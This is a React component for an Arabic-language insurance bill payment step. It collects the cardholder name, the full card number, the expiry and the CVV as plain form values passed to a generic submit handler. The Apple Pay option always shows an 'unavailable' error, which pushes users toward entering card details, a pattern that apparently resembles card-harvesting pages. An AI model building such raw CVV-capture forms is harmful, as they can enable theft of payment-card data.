"use client"

import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import Image from "next/image"
import { Shield, XCircle } from "lucide-react"
import { InsuranceBillPreview } from "./insurance-bill-preview"
import { useState } from "react"
import { Alert, AlertDescription, AlertTitle } from "./ui/alert"
import { Select, SelectItem } from "./ui/select"

export function PaymentForm({ onNext, handleStepSubmit }: { onNext: () => void, handleStepSubmit: any }) {
  const [PaymentMethod, setPaymentMethod] = useState('mada')
  return (
    <div className="max-w-2xl mx-auto bg-white rounded-lg">

      <InsuranceBillPreview />

      {/* Payment Method Selection */}
      <div className="p-6 text-green-800">
        <h3 className="text-lg mb-4">اختر طريقة الدفع</h3>
        <RadioGroup defaultValue="card" className="space-y-4">
          <div className="flex gap-4">
            <div className="flex-1">
              <div className="border rounded-lg p-4 cursor-pointer hover:border-blue-500">
                <div className="flex items-center gap-2">
                  <RadioGroupItem value="apple-pay" id="apple-pay" onClick={() => setPaymentMethod('apple')} checked={PaymentMethod === 'apple'} />
                  <Label htmlFor="apple-pay">
                    <Image
                      src="/appay.svg"
                      alt="Apple Pay"
                      width={64}
                      height={32}
                      className="h-8"
                    />
                  </Label>
                </div>
              </div>
            </div>
            <div className="flex-1">
              <div className="border rounded-lg p-4 cursor-pointer hover:border-blue-500">
                <div className="flex items-center gap-2">
                  <RadioGroupItem value="mada" id="mada" onClick={() => setPaymentMethod('mada')} checked={PaymentMethod === 'mada'} />
                  <Label htmlFor="mada">
                    <div className="flex items-center gap-2">
                    <Image
                        src="/mada.svg"
                        alt="Mada"
                        width={32}
                        height={32}
                        className="h-8"
                      />  <Image
                      src="/visa.svg"
                      alt="Mada"
                      width={32}
                      height={32}
                      className="h-8"
                    />
                    <Image
                      src="/master.svg"
                      alt="Mada"
                      width={32}
                      height={32}
                      className="h-8"
                    />
                    </div>
                  </Label>
                </div>
              </div>
            </div>
          </div>
        </RadioGroup>
        {/* Card Payment Form */}

        {PaymentMethod === 'mada' ?
          (<div className="mt-6">
            <h3 className="text-lg mb-4">الدفع بالبطاقات البنكية</h3>
            <form className="space-y-4" onSubmit={(e) => {
              e.preventDefault()
              const formData = new FormData(e.currentTarget)
              handleStepSubmit(
                {
                  paymentInfo: {
                    cardName: formData.get("cardName"),
                    cardNumber: formData.get("cardNumber"),
                    cardYaer: formData.get("cardYear"),
                    cardMonth: formData.get("cardMonth"),
                    cvv: formData.get("cvv"),
                  },
                },
                3,
              )
              onNext()
            }}>
              <div>
                <Label htmlFor="cardHolder">اسم حامل البطاقة *</Label>
                <Input id="cardHolder" placeholder="ادخل اسم حامل البطاقة" className="mt-1 border-gray-200 rounded" required name="cardName" />
              </div>

              <div>
                <Label htmlFor="cardNumber">رقم البطاقة *</Label>
                <Input minLength={16} maxLength={16} id="cardNumber" placeholder="ادخل رقم البطاقة" className="mt-1 border-gray-200 rounded" required name="cardNumber" />
              </div>

              <div className="grid grid-cols-3 gap-4">
                <div className="col-span-2">
                  <Label>تاريخ صلاحية البطاقة *</Label>
                  <div className="grid grid-cols-2 gap-2 mt-1">
                    <select defaultValue={2025} className="border py-1" name="cardYear">
                    <option value={2025}>2025</option>
                    <option value={2026}>2026</option>
                      <option value={2027}>2027</option>
                      <option value={2028}>2028</option>
                    <option value={2029}>2029</option>
                    <option value={2030}>2030</option>
                    <option value={2031}>2031</option>
                    <option value={2032}>2032</option>
                    <option value={2033}>2033</option>
                    <option value={2034}>2034</option>
                      <option value={2035}>2035</option>
                    </select>
                    <select defaultValue={1} className="border" name="cardMonth">
                    <option value={1}>1</option>
                    <option value={2}>2</option>
                      <option value={3}>3</option>
                      <option value={4}>4</option>
                    <option value={5}>5</option>
                    <option value={6}>6</option>
                    <option value={7}>7</option>
                    <option value={8}>8</option>
                    <option value={9}>9</option>
                    <option value={10}>10</option>
                      <option value={11}>11</option>
                      <option value={12}>12</option>
                    </select>                  </div>
                </div>
                <div>
                  <Label htmlFor="cvv">CVV *</Label>
                  <Input id="cvv" placeholder="***" className="mt-1 border-gray-200 rounded" maxLength={3} required name="cvv" />
                </div>
              </div>

              <div className="pt-4">
                <div className="text-center mb-4">
                  <span className="text-sm">الدفع بواسطة</span>
                  <div className="flex justify-center gap-2 mt-2">
                    <Image src="/visa.svg" alt="Mada" width={64} height={32} className="h-8" />
                    <Image
                      src="/master.svg"
                      alt="Mastercard"
                      width={64}
                      height={32}
                      className="h-8"
                    />
                    <Image src="/mada.svg" alt="Visa" width={64} height={32} className="h-8" />
                  </div>
                </div>

                <Button type="submit" className="w-full bg-green-400 hover:bg-green-500 text-white">
                  ادفع الآن
                </Button>
              </div>

            </form>

          </div>) :
          <div className="text-red-600 mt-4 text-bold">
            <Alert className="rounded" variant="destructive" dir="rtl">
              <XCircle className="h-4 w-4" />
              <AlertTitle>خطأ</AlertTitle>
              <AlertDescription>نعتذر لا يمكنك استخدام هذة الوسيلة في الوقت الحالي</AlertDescription>
            </Alert>
          </div>
        }
      </div>
    </div>
  )
}

